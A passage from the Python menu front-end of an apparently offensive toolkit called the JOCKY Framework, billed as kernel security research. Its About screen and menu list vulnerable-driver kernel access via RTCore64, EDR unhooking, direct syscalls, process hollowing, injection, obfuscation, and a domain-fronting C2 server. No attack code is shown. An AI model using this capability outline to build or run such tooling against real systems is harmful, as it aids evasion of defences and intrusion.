        console.print(Panel(ref.strip(), border_style="dim"))
    else:
        print(ref)
    pause()

# ── About ─────────────────────────────────────────────────────────────────────

def menu_about() -> None:
    clear()
    print_header("JOCKY Framework", "Advanced Kernel Security Research Platform")
    rprint("""
  [bold cyan]Components[/bold cyan]

  [yellow]Language Compiler[/yellow]
    Custom compiled language (.jk → LLVM IR → native exe / JIT)
    4 obfuscation passes: build-ID, XOR strings, entropy, dead code
    Import table variation: every binary has a different import hash

  [yellow]BYOVD Engine[/yellow]
    Vulnerable driver loader (RTCore64, CVE-2019-16098)
    Kernel base resolution (raw NtQuerySystemInformation + psapi fallback)
    Callback enumeration (PspCreateProcessNotifyRoutine PE scan)
    Kernel r/w (RTCore64 IOCTL 0x80002048 / 0x8000204C)
    LOLDrivers DB: 40+ entries with SHA-256 cross-reference

  [yellow]Evasion Engine[/yellow]
    API unhooking (detect/restore EDR hooks in ntdll.dll)
    Direct syscalls (SSN extraction, bypass ntdll hooks)
    Process hollowing (NtUnmapViewOfSection + PE remap)
    DLL injection (LoadLibraryW + reflective loader)
    Thread hijacking (SuspendThread + RIP redirect)

  [yellow]C2 Framework[/yellow]
    Asyncio multi-agent C2 server + agent
    Domain fronting (spoofed Host: header through CDN)
    SOCKS5 proxy routing
    Periodic beacon with command dispatch

  [yellow]Cross-Platform[/yellow]
    Windows 10/11 (primary), Linux (forensics.c + stdlib.py)
    /proc/modules, /proc/net/tcp, /proc/<pid>/comm on Linux

  [bold dim]Docs: docs/jockydocumentation.md | docs/systemarchitecture.md[/bold dim]
""")
    pause()

# ── Main menu ─────────────────────────────────────────────────────────────────

MAIN_MENU = [
    "[bold]Pre-built Scripts[/bold]              [dim]Run built-in .jk recon/exploit scripts[/dim]",
    "[bold]Custom Code Editor[/bold]             [dim]Write and run JOCKY code interactively[/dim]",
    "[bold]Pipeline Inspector[/bold]             [dim]Inspect tokens / AST / IR / semantic[/dim]",
    "[bold]Build[/bold]                          [dim]Compile .jk to native .exe[/dim]",
    "[bold]BYOVD Engine[/bold]                   [dim]Driver scan, kernel r/w, callback enum[/dim]",
    "[bold]Evasion Engine[/bold]                 [dim]API unhook, syscalls, hollowing, injection[/dim]",
    "[bold]C2 Management[/bold]                  [dim]Server, agent, domain fronting, SOCKS5[/dim]",
    "[bold]Language Reference[/bold]             [dim]JOCKY syntax and stdlib quick-ref[/dim]",
    "[bold]About[/bold]                          [dim]Framework overview[/dim]",
]

PLATFORM_INFO = f"{platform.system()} {platform.release()} | Python {platform.python_version()}"

def main() -> None:
    handlers = [
        menu_scripts,
        menu_editor,
        menu_inspector,
        menu_build,
        menu_byovd,
        menu_evasion,
        menu_c2,
        menu_langref,
        menu_about,
    ]

    while True:
        choice = menu("JOCKY Framework", MAIN_MENU,
                      f"Kernel Security Research Platform | {PLATFORM_INFO}")
        if choice == "0":
            clear()
            cprint("  [dim]Exiting JOCKY Framework.[/dim]")
            sys.exit(0)
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(handlers):
                handlers[idx]()
        except (ValueError, IndexError):
            pass


if __name__ == "__main__":
    main()
